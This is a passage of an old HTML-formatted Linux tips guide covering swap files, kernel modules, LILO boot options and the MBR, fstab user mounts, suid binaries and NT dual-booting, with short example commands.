left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick is to make a file and then tell the swapon program to use it. Here's how to create, for example, a 64</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >megs swap file on your root partition (of course make sure you have at least 64 megs free):</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >dd if=/dev/zero of=/swapfile bs=1024 count=65536</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will make a 64 megs (about 67 millions bytes) file on your hard drive. You now need to initialize it:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >mkswap /swapfile 65536</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >sync</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >And you can then add it to your swap pool:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >swapon /swapfile</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >With that you have 64 megs of swap added. Don't forget to add the swapon command to your startup files so</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the command will be repeated at each reboot.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.7</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 7: Kernel size and modules</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >To configure Linux to detect a new hardware part, especially on a new kernel, you may need to recompile the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >kernel. If you add too many devices in the kernel configuration, you may get an error message telling you that</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >the kernel is too big. The trick is to enable modules.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The kernel itself must be a certain size because it needs to be loaded in a fixed memory size. This is one</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >reason why modules can be very handy. If you enable modules, you will need to make them:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >make modules</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and install them:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >make modules_install</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Then using the modprobe utility you can load selected modules on bootup. This way the kernel will be</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >smaller and will compile with no error.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.8</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 8: The boot prompt</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The Linux system uses a program called LILO to boot itself. This is the LInux LOader, and will load a kernel</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >and can pass various parameters. This is what the "boot:" prompt is for.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >At the "boot:" prompt, you can enter a lot of parameters. You can send parameters to drivers like the ethernet</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >driver, telling it at which IRQ the ethernet card is located, or you can pass parameters to the kernel, like</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >memory size or what to do in a panic. Reading the LILO manual will tell you all of the nice things LILO can</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >be used for.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that for device drivers compiled as modules, you need to pass values when you load these drivers, and</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >not on the "boot:" prompt.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.9</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 9: Wrong memory size found</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The Linux kernel will detect various settings from your computer configuration. This includes the size of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >memory you have. In some cases, it will find the wrong size. For example, it could find only 64 megs of</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >memory when in fact you have 128 megs.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick here is to specify the amount of RAM memory you have with the "mem=" parameter. Here is what</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >you would type when your system boots if you have 128 megs of memory:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >LILO boot: linux mem=128M</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This will tell LILO to load the linux kernel with 128 megs of memory.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.10</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 10: Master boot record and LILO</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >What is the master boot record (MBR) and why does LILO erase the old boot loader? Every hard drive has a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >top space called the MBR where the BIOS will try to load an operating system. Every system has its own</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >loader. DOS has DOS-MBR, Windows NT has the NTLDR and Linux has LILO.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When you install LILO, you can install it in the MBR or in a boot record for the Linux partition. If you want</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to keep your current boot loader, you can select the Linux partition, and make sure it is the active partition in</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >fdisk. This way you will be able to boot to LILO, and then boot the old loader from the MBR.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >If you plan on only using Linux on your system, you can tell LILO to boot right into Linux and not display a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >"boot:" prompt, and you can install it in the MBR.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.11</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 11: LILO can't find a kernel on a big drive</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >On some big hard drives, LILO can have problems loading your kernel. The problem is because the hard</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >drive has more then 1024 cylinders.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The trick is to make sure your kernel is in the first 1024 cylinders so LILO can find it. The way to do this is</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to make a small /boot partition at the begining of the drive, and make sure the kernel is in the /boot directory.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can set the partitions in fdisk, and select the right path for the kernel in /etc/lilo.conf so LILO knows</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >where it is. When you compile your kernel, simply move the new kernel in that directory so LILO can load it.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.12</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 12: X Window configuration options</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Each Linux distribution has its own X Window configuration program. XFree86 also has a text-based</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >configuration program which is complex to use. But what if both the distribution program and xf86config, the</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >text-based configuration for XFree86, do not seem to do what you need? XFree86 also comes with a</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >graphical configuration tool.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The name of the graphical program is XF86Setup. This will launch a graphical window and allow you to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >configure the X Window Server. So if you don't like the console configuration programs, you can use this</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >one:</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.13</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 13: Allowing users to mount drives</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >By default, Linux will not allow users to mount drives. Only root can do it, and making the mount binary suid</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >root is not a good idea. With a special command in the /etc/fstab file, you can change that.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >This is a typical line for the fd0 (A:) drive in /etc/fstab:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >/dev/fd0 /mnt auto noauto,user 1 1</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The keywords here are noauto and user. Noauto tells mount not the try to mount a diskette on boot, and user</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >allows any user to mount the drive into /mnt. The auto keyword is also interesting. It tells mount to try to find</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >out which file system is on the diskette. You could also use msdos or ext2.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.14</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 14: Allowing users to run root programs</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When a user starts a command, it runs with the permissions of that user. What if you want to allow them to</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >run some commands with root permissions? You can, and that's called suid.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >You can set a command to be suid root with the chmod command. This will make it run as root even if a user</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >starts it. Here is how to set mybin suid root:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 9pt; FONT-FAMILY: Courier; mso-font-kerning: 0pt; mso-bidi-font-family: Courier;"  >chmod +s mybin</SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Note that you must be very careful with this option. If the command has any security hole, or allows the user</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to access other files or programs, the user could take over the root account and the whole system.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.15</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 15: Linux and NT booting</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Some people choose to have both Windows NT and Linux on the same system. Windows NT has its own</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >boot loader called NTLDR and Linux has LILO. Which should go on the MBR?</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >The safest way is to install Windows NT first, and give it the MBR. Then, when you install Linux, tell LILO</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >to install on the Linux partition. Also set the Linux partition as the active partition. When the system boots,</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >LILO will be loaded, and if you want to boot Windows NT, then LILO can load the MBR with NTLDR in it.</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >There is a mini HOWTO text covering this subject available at</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: blue; mso-font-kerning: 0pt;"  ><A rel="nofollow" href="http://metalab.unc.edu/pub/Linux/docs/HOWTO"  ><FONT face="Times New Roman"  >http://metalab.unc.edu/pub/Linux/docs/HOWTO</FONT></A></SPAN><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.16</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 16: Annoying boot messages</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >When recompiling your kernel, you might end up seeing strange messages on bootup like:</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" 